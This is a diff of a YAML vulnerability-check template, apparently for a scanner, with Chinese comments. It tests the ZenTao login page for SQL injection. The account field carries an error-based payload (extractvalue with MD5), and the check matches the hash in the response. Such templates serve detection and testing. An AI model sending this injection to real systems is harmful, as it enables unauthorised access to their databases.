@@ -6,18 +6,22 @@
 - method:
   - method: "post"
 
+#漏洞的位置
+- url:
+  - url : "/zentao/user-login.html"
+
 #payload
 - payload:
   - payload: "account=admin' and (select extractvalue(1,concat(0x7e,(MD5(007)),0x7e)))#"
+
+#response包里的状态码
+- status:
+  - status: "200"
 
 #response包里的关键字
 - word:
   - word:
       - "8f14e45fceea167a5a36dedd4bea254"
-
-#漏洞的位置
-- url:
-  - url : "/zentao/user-login.html"
 
 #验证是否攻击成功的 请求方式
 - method-V:
